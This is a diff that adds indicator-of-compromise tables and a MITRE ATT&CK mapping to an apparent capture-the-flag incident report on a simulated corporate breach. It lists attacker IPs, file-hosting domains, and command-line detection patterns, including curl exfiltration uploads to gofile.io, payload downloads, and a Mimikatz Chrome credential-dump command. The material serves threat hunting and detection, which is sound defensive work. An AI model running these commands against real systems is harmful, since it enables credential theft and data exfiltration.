@@ -76,3 +76,81 @@ No evidence of lateral movement or impact (e.g., ransomware) was observed in the
 - **C2 Indicator:** Metasploit named pipe `msf-pipe-5902`
 
 This was a highly realistic post-exploitation chain: RDP initial access → thorough discovery → credential theft → data staging → multi-stage exfiltration using public file-hosting services.
+
+---
+# Indicators of Compromise (IOCs) – Azuki Corporation Breach (CTF 3)
+
+The following IOCs were observed during the incident on 25 November 2025. These can be used for threat hunting, blocking, and detection rule creation.
+
+## Network IOCs
+
+| Type          | Indicator                          | Context / Notes |
+|---------------|------------------------------------|-----------------|
+| IP (Source)   | 10.1.0.204                         | Attacker RDP source IP (initial access) |
+| IP (C2/Staging) | 108.181.20.36                    | litter.catbox.moe (payload hosting) |
+| IP (Exfil)    | 45.112.123.227                     | store1.gofile.io (exfiltration destination) |
+| Domain        | litter.catbox.moe                  | Initial payload download site |
+| Domain        | store1.gofile.io                   | Exfiltration upload endpoint |
+| URL           | https://litter.catbox.moe/gfdb9v.7z| Initial payload (KB5044273-x64.7z) |
+| URL           | https://litter.catbox.moe/mt97cj.7z| Secondary credential tool (m-temp.7z) |
+| URL           | https://store1.gofile.io/uploadFile| Exfiltration endpoint (multiple archives uploaded) |
+
+## File IOCs
+
+| Type                  | Indicator                                                                 | Path / Context |
+|-----------------------|---------------------------------------------------------------------------|----------------|
+| File (Payload)        | KB5044273-x64.7z                                                          | Downloaded masqueraded archive |
+| File (Payload)        | m-temp.7z                                                                 | Secondary credential tool archive |
+| File (Executable)     | m.exe                                                                     | Renamed Mimikatz-like credential dumper |
+| File (Archive)        | credentials.tar.gz                                                        | Contains Azuki-Passwords.kdbx + KeePass-Master-Password.txt |
+| File (Archive)        | chrome-session-theft.tar.gz                                               | Contains chrome-real-dump.txt + Chrome-Cookies.db |
+| File (Plaintext Creds)| OLD-Passwords.txt                                                         | Viewed via notepad.exe |
+| File (Plaintext Creds)| KeePass-Master-Password.txt                                               | Exfiltrated with KeePass DB |
+| Directory (Staging)   | C:\ProgramData\Microsoft\Crypto\staging                                   | Primary data aggregation location |
+| Directory (Staging)   | C:\Windows\Temp\cache                                                     | Initial payload drop and extraction location |
+
+## Process/Command IOCs
+
+| Type                  | Indicator                                                                 | Notes |
+|-----------------------|---------------------------------------------------------------------------|-------|
+| Command Line          | curl.exe -L -o .* https://litter.catbox.moe/.*                             | Payload downloads |
+| Command Line          | curl.exe -X POST -F file=@.* https://store1.gofile.io/uploadFile          | Exfiltration uploads |
+| Command Line          | 7z.exe x .* -p.* -oC:\Windows\Temp\cache\ -y                               | Archive extraction |
+| Command Line          | robocopy.exe .* C:\ProgramData\Microsoft\Crypto\staging .* /E /R:1 /W:1 /NP | Data staging |
+| Command Line          | m.exe privilege::debug "dpapi::chrome /in:.*Login Data /unprotect" exit   | Chrome credential dump |
+| Command Line          | tar.exe -czf .* chrome-real-dump.txt Chrome-Cookies.db                    | Browser cred packaging |
+| Command Line          | nltest.exe /domain_trusts /all_trusts                                     | Domain trust discovery |
+| Command Line          | NETSTAT.EXE -ano                                                          | Network connection enumeration |
+| Named Pipe            | \\Device\\NamedPipe\\msf-pipe-.*                                           | Metasploit Meterpreter C2 |
+
+## Behavioral IOCs
+
+- Execution of curl.exe for outbound HTTPS downloads/uploads to public file-hosting services
+- Use of 7z.exe/tar.exe/robocopy.exe for staging and packaging
+- Creation of files in `C:\ProgramData\Microsoft\Crypto\staging`
+- Execution from `C:\Windows\Temp\cache`
+- Notepad opened on plaintext password files in user Desktop
+
+I recommend that these IOCs be integrated into EDR/SIEM detection rules, firewall blocks, and threat intelligence feeds for proactive defense.
+
+---
+# MITRE ATT&CK Techniques Observed in Azuki Corporation Breach (CTF 3)
+
+Only techniques with direct evidence of observed activity are listed below.
+
+| Technique ID                  | Technique Name                              | Sub-Technique (if applicable)                  | Observed Activity |
+|-------------------------------|---------------------------------------------|------------------------------------------------|-------------------|
+| T1021.001                     | Remote Desktop Protocol                     | -                                              | Initial access and multiple logons via RDP from 10.1.0.204 to azuki-adminpc as yuki.tanaka |
+| T1033                         | System Owner/User Discovery                 | -                                              | Execution of `qwinsta.exe` and `query user` to enumerate active sessions |
+| T1049                         | System Network Connections Discovery        | -                                              | Execution of `netstat -ano` |
+| T1074.001                     | Data Staged                                 | Local Data Staging                             | Creation and use of `C:\ProgramData\Microsoft\Crypto\staging` for aggregating stolen files |
+| T1078                         | Valid Accounts                              | -                                              | Use of compromised yuki.tanaka account throughout the attack |
+| T1083                         | File and Directory Discovery                | -                                              | Recursive search with `where /r C:\Users *.kdbx` for KeePass databases |
+| T1090.001                     | Proxy                                       | Internal Proxy (Named Pipes)                   | Creation of Metasploit named pipe `\\Device\\NamedPipe\\msf-pipe-5902` |
+| T1105                         | Ingress Tool Transfer                       | -                                              | Multiple downloads via curl from litter.catbox.moe (initial payload and secondary credential tool) |
+| T1119                         | Automated Collection                        | -                                              | Use of robocopy and tar to systematically collect and archive documents/credentials |
+| T1140                         | Deobfuscate/Decode Files or Information     | -                                              | Extraction of password-protected 7z archives containing payloads |
+| T1482                         | Domain Trust Discovery                      | -                                              | Execution of `nltest /domain_trusts /all_trusts` |
+| T1552.001                     | Unsecured Credentials: Credentials in Files | -                                              | Discovery and exfiltration of `OLD-Passwords.txt` and `KeePass-Master-Password.txt`; viewing via notepad.exe |
+| T1555.003                     | Credentials from Password Stores            | Credentials from Web Browsers                  | Execution of renamed Mimikatz (`m.exe`) with `dpapi::chrome` module to dump Chrome saved passwords |
+| T1567                         | Exfiltration Over Web Service               | -                                              | Multiple curl POST uploads of tar.gz archives to store1.gofile.io |
